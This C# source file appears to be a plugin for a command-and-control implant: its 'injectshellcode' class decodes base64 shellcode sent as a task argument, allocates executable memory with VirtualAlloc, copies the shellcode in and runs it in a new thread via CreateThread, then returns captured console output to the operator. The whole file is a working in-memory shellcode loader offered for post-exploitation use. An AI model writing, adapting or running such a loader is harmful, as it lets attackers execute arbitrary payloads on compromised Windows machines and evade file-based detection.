using PluginBase;
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Plugin
{
    public class injectshellcode
    {
        public static ResponseResult Execute(Dictionary<string, object> args)
        {
            string res="";

            if (args.ContainsKey("File") && (string)args["File"] != "")
            {
                var x64shellcode = Convert.FromBase64String((string)args["shellcode"]);
                //var psStr = Encoding.UTF8.GetString(base64EncodedBytes);
                //psStr = psStr.Replace("Write-Host", "Write-Output");



                FileStream filestream = new FileStream("out.txt", FileMode.Create);
                var streamwriter = new StreamWriter(filestream);
                streamwriter.AutoFlush = true;
                Console.SetOut(streamwriter);
                Console.SetError(streamwriter);

               // byte[] x64shellcode = new byte[2] { 0xfc, 0x48 };

                IntPtr funcAddr = VirtualAlloc(
                                      IntPtr.Zero,
                                      (ulong)x64shellcode.Length,
                                      (uint)StateEnum.MEM_COMMIT,
                                      (uint)Protection.PAGE_EXECUTE_READWRITE);
                Marshal.Copy(x64shellcode, 0, (IntPtr)(funcAddr), x64shellcode.Length);

                IntPtr hThread = IntPtr.Zero;
                uint threadId = 0;
                IntPtr pinfo = IntPtr.Zero;

                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                WaitForSingleObject(hThread, 0xFFFFFFFF);
      
                using (StreamReader sr = new StreamReader("out.txt"))
                {
                    res = sr.ReadToEnd();
                }
            }
            return new ResponseResult
            {
                completed = "true",
                user_output = res,
                task_id = (string)args["task-id"],
                status = "error"
            };
        }
        #region pinvokes
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpStartAddr,
            ulong size,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(
            uint lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            uint dwCreationFlags,
            ref uint lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);

        public enum StateEnum
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_FREE = 0x10000
        }

        public enum Protection
        {
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
        }
        #endregion
    }
}